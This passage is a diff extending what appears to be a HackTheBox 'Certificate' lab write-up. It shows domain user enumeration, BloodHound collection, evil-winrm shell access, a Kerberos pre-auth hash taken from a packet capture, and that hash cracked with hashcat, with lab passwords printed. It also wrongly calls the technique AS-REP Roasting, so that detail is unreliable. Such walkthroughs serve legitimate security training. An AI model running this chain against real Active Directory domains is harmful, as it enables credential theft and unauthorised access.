@@ -340,10 +340,38 @@ SMB         <IP>     445    DC01             NETLOGON        READ            Log
 SMB         <IP>     445    DC01             SYSVOL          READ            Logon server share
 ```
 
+<p class="indent-paragraph">
+Using the <code>nxc</code> tool with the <code>--rid-brute</code> flag against the <code>DC01</code> host, we were able to extract a full list of domain SIDs and filter them by user type.
+</p>
 
+```
+~$ nxc smb certificate.htb -u sara.b -p 'Blink182' --rid-brute | grep "SidTypeUser" | awk -F '\\\\' '{print $2}' | awk '{print $1}'
 
+Administrator
+Guest
+krbtgt
+DC01$
+WS-01$
+Kai.X
+Sara.B
+John.C
+Aya.W
+Nya.S
+Maya.K
+Lion.SK
+Eva.F
+Ryan.K
+akeder.kh
+kara.m
+Alex.D
+karol.s
+saad.m
+xamppuser
+WS-05$
+```
 
----
+### 🔍 Enumerating AD Group Memberships from a Low-Privileged User
+
 <p class="indent-paragraph">
 Next, the <code>/etc/krb5.conf</code> file was updated to define <code>certificate.HTB</code> as the default realm. The configuration disabled automatic DNS lookups and explicitly pointed both the KDC and admin server fields to the target IP. This setup is critical for interacting with Kerberos-based environments and enables tools such as <code>Impacket</code><span class="codefix">,</span> <code>BloodHound</code><span class="codefix">,</span> and <code>Certipy</code> to function correctly.
 </p>
@@ -368,4 +396,215 @@ Next, the <code>/etc/krb5.conf</code> file was updated to define <code>certifica
 [domain_realm]
     .certificate.htb = certificate.HTB
     certificate.htb = certificate.HTB
+```
+
+<p class="indent-paragraph">
+For successful Kerberos authentication and to avoid clock skew issues during enumeration, the attacker system's local time must be closely synchronized with the Domain Controller. This was achieved using a custom Bash script that leverages <code>ntpdate</code> to align the machine’s time with the DC. Proper time sync ensures seamless interaction with Kerberos-based services and prevents authentication failures during tools execution like <code>BloodHound</code><span class="codefix">.</span>
+</p>
+
+```
+~$ nano sync_time_from_dc.sh
+
+#!/bin/bash
+
+# Prompt for the IP address of the Domain Controller
+read -p "[?] Enter the IP address of the Domain Controller: " DC_IP
+
+# Validate input
+if [[ -z "$DC_IP" ]]; then
+  echo "[-] No IP address provided. Exiting."
+  exit 1
+fi
+
+echo "[*] Synchronizing local time with Domain Controller ($DC_IP)..."
+
+# Execute ntpdate with root privileges to sync clock
+if sudo ntpdate "$DC_IP"; then
+  echo "[+] Local system time successfully synchronized with DC ($DC_IP)."
+else
+  echo "[-] Failed to synchronize time. Check connectivity or sudo permissions."
+  exit 1
+fi
+
+~$ ./sync_time_from_dc.sh
+
+[?] Enter the IP address of the Domain Controller: <IP>
+[*] Synchronizing local time with Domain Controller (<IP>)...
+2025-07-22 02:24:35.875681 (-0300) +28800.974398 +/- 0.066239 <IP> s1 no-leap
+CLOCK: time stepped by 28800.974398
+[+] Local system time successfully synchronized with DC (<IP>).
+```
+
+
+<p class="indent-paragraph">
+With proper domain configuration in place, the BloodHound data collection process was initiated using the <code>bloodhound-python</code> collector directly from the attacker’s machine. The user <code>sara.b</code> was authenticated via NTLM after a Kerberos TGT failure caused by clock skew. Despite this fallback, enumeration proceeded successfully, identifying 1 domain, 3 computers, 19 users, 58 groups, and other relevant Active Directory objects within seconds. This dataset was later used for relationship mapping and privilege escalation path discovery within the BloodHound interface.
+</p>
+
+```
+~$ bloodhound-python -u 'sara.b' -p 'Blink182' -d certificate.htb -dc dc01.certificate.htb -c All -ns <IP>
+
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: certificate.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc01.certificate.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 3 computers
+INFO: Connecting to LDAP server: dc01.certificate.htb
+INFO: Found 19 users
+INFO: Found 58 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: WS-05.certificate.htb
+INFO: Querying computer: WS-01.certificate.htb
+INFO: Querying computer: DC01.certificate.htb
+INFO: Done in 00M 24S
+```
+
+<p class="indent-paragraph">
+Once the data was ingested into the BloodHound interface, an initial relationship query was run against the compromised user <code>SARA.B@CERTIFICATE.HTB</code><span class="codefix">.</span> The graph revealed that this account is part of common groups like <code>Domain Users</code> and <code>Users</code><span class="codefix">,</span> but also belongs to strategic groups such as <code>HELP DESK</code><span class="codefix">,</span> <code>REMOTE DESKTOP USERS</code><span class="codefix">,</span> and <code>REMOTE MANAGEMENT USERS</code><span class="codefix">.</span>
+</p>
+
+<div style="margin-top: 20px;">
+  <img src="/img/redteam/htb/certificate/bloodhound-1.png" alt="BloodHound" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
+</div>
+
+### ⬆️ Validating Remote Shell Access through WinRM
+
+<p class="indent-paragraph">
+To validate practical access rights and pivot capabilities, the <code>nxc winrm</code> module was used to test remote connectivity via Windows Remote Management (WinRM). The result confirmed that the compromised user <code>SARA.B@CERTIFICATE.HTB</code> was able to successfully authenticate and establish a remote PowerShell session with the target system. The successful connection, indicated by the <code>Pwn3d!</code> tag, demonstrates that WinRM is enabled and accessible, allowing post-exploitation tools such as <code>evil-winrm</code> to be leveraged for further enumeration and lateral movement within the domain.
+</p>
+
+```
+~$ nxc winrm certificate.htb -u sara.b -p Blink182 -d certificate.htb
+
+WINRM       <IP>     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb)
+WINRM       <IP>     5985   DC01             [+] certificate.htb\sara.b:Blink182 (Pwn3d!)
+```
+
+<p class="indent-paragraph">
+With WinRM access confirmed, a full remote PowerShell session was initiated using <code>evil-winrm</code><span class="codefix">.</span> Upon successful authentication, the session landed directly on the user context of <code>certificate\sara.b</code><span class="codefix">.</span>
+</p>
+
+```
+~$ evil-winrm -i certificate.htb -u sara.b -p Blink182                               
+                                        
+Evil-WinRM shell v3.7
+                                        
+Info: Establishing connection to remote endpoint
+~$ *Evil-WinRM* PS C:\Users\Sara.B\Documents> whoami
+certificate\sara.b
+```
+
+<p class="indent-paragraph">
+Navigating through the user's document folder, a subdirectory named <code>WS-01</code> revealed two files of interest: <code>Description.txt</code> and <code>WS-01_PktMon.pcap</code><span class="codefix">.</span> The text file described anomalous behavior related to a shared folder named <code>Reports</code> hosted on <code>DC01</code><span class="codefix">.</span> Specifically, it indicated that invalid credentials would return a typical error, while valid credentials caused the file explorer to freeze and crash<span class="codefix">.</span> This description suggests a deeper issue potentially tied to authentication handling or resource permissions, making the accompanying <code>.pcap</code> file a valuable asset for further network traffic analysis.
+</p>
+
+```
+~$ *Evil-WinRM* PS C:\Users\Sara.B\Documents> dir
+
+
+    Directory: C:\Users\Sara.B\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        11/4/2024  12:53 AM                WS-01
+
+
+~$ *Evil-WinRM* PS C:\Users\Sara.B\Documents> cd WS-01
+~$ *Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> dir
+
+
+    Directory: C:\Users\Sara.B\Documents\WS-01
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        11/4/2024  12:44 AM            530 Description.txt
+-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap
+
+
+~$ *Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> type Description.txt
+The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
+When a user tries to input bad credentials, it returns bad credentials error.
+But when a user provides valid credentials the file explorer freezes and then crashes!
+
+~$ *Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> download WS-01_PktMon.pcap
+                                        
+Info: Downloading C:\Users\Sara.B\Documents\WS-01\WS-01_PktMon.pcap to WS-01_PktMon.pcap
+                                        
+Info: Download successful!
+```
+
+### 🧩 Offline Attack Surface Identified via PCAP Inspection
+
+<p class="indent-paragraph">
+An initial traffic inspection was performed using <code>tshark</code> to identify Kerberos authentication attempts. The goal was to isolate AS-REQ messages (Kerberos message type 10) that used the encryption type <code>AES256-CTS-HMAC-SHA1-96</code> (etype 18), which is commonly used for strong encryption in Active Directory environments. The following command was used to extract the frame number, source IP address, username (CNameString), Kerberos realm, etype, and the cipher value from the capture file:
+</p>
+
+```
+~$ tshark -r WS-01_PktMon.pcap -Y "kerberos.msg_type == 10 and kerberos.etype == 18" -T fields -e frame.number -e ip.src -e kerberos.CNameString -e kerberos.realm -e kerberos.etype -e kerberos.cipher 
+
+917	192.168.56.128	Lion.SK	CERTIFICATE	18 23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0 
+```
+
+<p class="indent-paragraph">
+This filtered output revealed a frame where the user <code>Lion.SK</code> from realm <code>CERTIFICATE</code> sent an AS-REQ using etype 18, along with a full Kerberos cipher string. This information can be critical for password brute-force or offline cracking scenarios if the encryption key can be targeted.
+</p>
+<p class="indent-paragraph">
+To further validate and visualize the structure of the packet, the corresponding frame (frame 917) was opened in Wireshark. As shown in the screenshot below, the cipher value is embedded within the <code>PA-DATA</code> structure of the Kerberos request. Identifying this specific field within the raw bytes confirms the integrity and position of the extracted hash.
+</p>
+
+
+<div style="margin-top: 20px;">
+  <img src="/img/redteam/htb/certificate/WiresharkKerberosAS-REQFrame917.png" alt="Wireshark Kerberos AS-REQ Frame 917" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
+</div>
+
+<p class="indent-paragraph">
+Following the network traffic analysis, an AS-REQ message from the user <code>Lion.SK</code> was identified using <code>tshark</code>, with the encryption type <code>etype 18</code> (AES256-CTS-HMAC-SHA1-96) and containing a cipher blob indicative of pre-authentication data exposure. This condition made the user a viable target for an <strong>AS-REP Roasting</strong> attack, which exploits the absence of enforced pre-authentication on Kerberos accounts. The extracted hash was formatted for cracking and successfully processed using <code>hashcat</code> with mode <code>19900</code><span class="codefix">,</span> revealing the user’s plaintext password as <code>!QAZ2wsx</code><span class="codefix">.</span>
+</p>
+
+```
+~$ nano hash-lion.txt
+
+$krb5pa$18$Lion.SK$CERTIFICATE.HTB$<cipher>
+
+~$ hashcat -m 19900 -a 0 hash-lion.txt /usr/share/wordlists/rockyou.txt       
+hashcat (v6.2.6) starting
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx
+```
+
+<p class="indent-paragraph">
+With the password <code>!QAZ2wsx</code> obtained from a successful AS-REP Roasting attack, access to the target machine was established via <code>evil-winrm</code> using the credentials <code>Lion.SK</code>. Upon authentication, the session opened a remote PowerShell shell, confirming valid user access. Navigating through the user's profile, the <code>user.txt</code> file was located on the Desktop directory and successfully retrieved, revealing the first flag.
+</p>
+
+```
+~$ evil-winrm -i 10.10.11.71 -u Lion.SK -p '!QAZ2wsx'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Info: Establishing connection to remote endpoint
+~$ *Evil-WinRM* PS C:\Users\Lion.SK\Desktop> dir
+
+
+    Directory: C:\Users\Lion.SK\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        7/24/2025   9:00 AM             34 user.txt
+
+~$ *Evil-WinRM* PS C:\Users\Lion.SK\Desktop> cat *
+*********************************
 ```
